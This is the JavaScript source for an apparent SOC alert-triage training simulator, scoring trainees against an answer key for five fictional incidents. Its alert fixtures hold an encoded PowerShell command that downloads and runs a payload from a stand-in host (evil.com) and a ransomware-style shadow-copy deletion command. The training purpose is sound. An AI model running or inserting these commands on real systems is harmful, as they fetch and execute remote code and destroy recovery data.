// Complete Alert Dataset (Stages 1 through 5)
const alerts = [
  // Stage 2 & 3: Core Infrastructure
  {
    id: 'ALT-1001',
    title: 'Suspicious PowerShell Execution',
    type: 'endpoint',
    severity: 'high',
    timestamp: '2026-09-03 10:42:11 UTC',
    sourceIp: '192.168.1.105',
    username: 'j.doe',
    correctAction: 'escalate',
    logs: {
      EventID: 4688,
      ProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      CommandLine: "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
      ParentProcess: "C:\\Windows\\explorer.exe"
    },
    explanation: "High Risk: Encoded PowerShell command pulling down external payloads bypasses default system policy."
  },

  // Stage 4: Phishing Scenarios
  {
    id: 'ALT-2001',
    title: 'Phishing: Spoofed Executive Credential Harvest',
    type: 'phishing',
    severity: 'high',
    timestamp: '2026-09-03 11:05:22 UTC',
    sourceIp: '203.0.113.195',
    username: 'c.smith (CFO)',
    correctAction: 'escalate',
    logs: {
      EmailSubject: "URGENT: Verify Your Payroll Details Immediately",
      SenderHeader: "CEO Direct <ceo-notice@mail-payroll-update-sec.com>",
      ReturnPath: "bounce@attacker-server.ru",
      SPF_Check: "FAIL",
      DKIM_Check: "FAIL",
      EmbeddedURL: "https://login-microsoft-portal.auth-verify.xyz/login"
    },
    explanation: "High Risk: Spoofed executive address targeting credentials via external domain with failing SPF/DKIM checks."
  },

  // Stage 5: Malware Incidents
  {
    id: 'ALT-3001',
    title: 'Malware: Rapid File Encryption (Ransomware Behavior)',
    type: 'malware',
    severity: 'high',
    timestamp: '2026-09-03 11:30:15 UTC',
    sourceIp: '10.0.2.88',
    username: 'r.vance',
    correctAction: 'escalate',
    logs: {
      Process: "svchost_update.exe",
      Path: "C:\\Users\\r.vance\\AppData\\Local\\Temp\\svchost_update.exe",
      FileModificationsCount: 1420,
      ModifiedExtensions: [".locked", ".crypto"],
      ShadowCopyDeletionAttempt: "vssadmin.exe Delete Shadows /All /Quiet",
      EDR_Status: "Alert Only"
    },
    explanation: "High Risk: Ransomware pattern executing from a temp directory, wiping shadow copies, and rapidly encrypting user files. Immediate host isolation and incident escalation required."
  },
  {
    id: 'ALT-3002',
    title: 'Malware: Known Trojan Hash Detected',
    type: 'malware',
    severity: 'medium',
    timestamp: '2026-09-03 11:35:40 UTC',
    sourceIp: '192.168.1.201',
    username: 'k.miller',
    correctAction: 'remediate',
    logs: {
      Filename: "Free_PDF_Converter.exe",
      SHA256: "2b992f232490d1f11c52b2f8a4f107f0c39a3f292211f32a512d7c5a08901b0f",
      VirusTotalHits: "54/72 Engines (Trojan.Win32.Agent)",
      ExecutionState: "Quarantined by AV",
      NetworkConnections: "None"
    },
    explanation: "Medium Risk: Known malware hash blocked and quarantined by host endpoint protection before network callback occurred. Host cleanup and audit recommended."
  },
  {
    id: 'ALT-3003',
    title: 'Malware: Unrecognized Binary Outbound Beaconing',
    type: 'malware',
    severity: 'high',
    timestamp: '2026-09-03 11:40:02 UTC',
    sourceIp: '10.0.5.12',
    username: 'b.taylor',
    correctAction: 'escalate',
    logs: {
      Process: "update_checker.exe",
      DestinationIP: "185.220.101.5",
      DestinationPort: 443,
      BytesSent: "45.2 MB",
      BytesReceived: "1.2 MB",
      BeaconInterval: "60 seconds (Strict Jitter: 2%)"
    },
    explanation: "High Risk: Consistent traffic intervals (beaconing) paired with high outbound data transfer indicate an active Command & Control (C2) channel and potential data exfiltration."
  }
];

let selectedAlert = null;
let closedCount = 0;
let correctCount = 0;

function init() {
  renderAlertQueue();
}

function renderAlertQueue() {
  const listEl = document.getElementById('alert-list');
  listEl.innerHTML = '';

  alerts.forEach(alert => {
    const card = document.createElement('div');
    card.className = `alert-card ${alert.severity}`;
    card.onclick = () => selectAlert(alert, card);
    card.innerHTML = `
      <div class="alert-title">${alert.title}</div>
      <div class="alert-meta">${alert.id} | ${alert.type.toUpperCase()}</div>
    `;
    listEl.appendChild(card);
  });
}

function selectAlert(alert, cardEl) {
  selectedAlert = alert;
  
  document.querySelectorAll('.alert-card').forEach(c => c.classList.remove('active'));
  cardEl.classList.add('active');

  const detailEl = document.getElementById('alert-detail');
  detailEl.innerHTML = `
    <h3>${alert.title} (${alert.id})</h3>
    <p><strong>Timestamp:</strong> ${alert.timestamp}</p>
    <p><strong>Category:</strong> <code>${alert.type.toUpperCase()}</code></p>
    <p><strong>Target User:</strong> <code>${alert.username}</code></p>
    <p><strong>Source IP:</strong> <code>${alert.sourceIp}</code></p>
    <h4>Raw Incident Logs & Indicators</h4>
    <div class="log-box">${JSON.stringify(alert.logs, null, 2)}</div>
  `;

  const feedbackEl = document.getElementById('feedback');
  feedbackEl.style.display = 'none';
}

function makeDecision(action) {
  if (!selectedAlert) {
    alert("Select an alert from the queue first!");
    return;
  }

  const feedbackEl = document.getElementById('feedback');
  feedbackEl.style.display = 'block';

  closedCount++;
  if (action === selectedAlert.correctAction) {
    correctCount++;
    feedbackEl.className = 'feedback-box correct';
    feedbackEl.innerHTML = `<strong>Correct Decision!</strong><br>${selectedAlert.explanation}`;
  } else {
    feedbackEl.className = 'feedback-box incorrect';
    feedbackEl.innerHTML = `<strong>Incorrect Decision.</strong><br>${selectedAlert.explanation}`;
  }

  document.getElementById('closed-count').innerText = closedCount;
  const accuracy = Math.round((correctCount / closedCount) * 100);
  document.getElementById('accuracy').innerText = `${accuracy}%`;
}

window.onload = init;
